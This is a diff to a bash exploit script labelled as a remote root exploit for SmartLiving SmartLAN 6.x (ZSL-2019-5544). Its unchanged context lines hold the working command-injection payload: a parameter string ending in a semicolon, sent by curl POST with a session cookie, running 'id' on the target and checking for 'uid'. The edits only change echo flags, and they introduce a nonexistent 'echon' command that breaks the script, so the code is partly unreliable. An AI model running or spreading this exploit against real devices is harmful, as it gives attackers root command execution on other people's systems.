@@ -133,13 +133,13 @@ PARAMS="mod=testemail&par=;"
 CHECK=${URL:4:1}
 
 if [ "$#" -ne 1 ]; then
-	echo -en "\e[34m"
+	echon "\e[34m"
 	echo "==============================================="
 	echo " SmartLiving  SmartLAN 6.x Remote Root Exploit"
-	echo -e "\t\tZSL-2019-5544"
+	echo "\t\tZSL-2019-5544"
 	echo "==============================================="
-	echo -en "\e[00m"
-	echo -e "\nUsage: $0 http(s)://ip:port\n"
+	echon "\e[00m"
+	echo "\nUsage: $0 http(s)://ip:port\n"
     exit 0
 fi
 
@@ -153,7 +153,7 @@ if [ "$CHECK" == "s" ]; then
 	fi
 	if curl -sik -X POST "$URL$CGI" -H "Cookie: $COOK" -d"${PARAMS}id" | grep uid 1>/dev/null
 	then
-		echo -e "ACCESS GRANTED!\n"
+		echo "ACCESS GRANTED!\n"
 	else
 		echo "Invalid credentials."
 		exit 0
@@ -175,7 +175,7 @@ else
 	fi
 	if curl -si -X POST "$URL$CGI" -H "Cookie: $COOK" -d"${PARAMS}id" | grep uid 1>/dev/null
 	then
-		echo -e "ACCESS GRANTED!\n"
+		echo "ACCESS GRANTED!\n"
 	else
 		echo "Invalid credentials."
 		exit 0
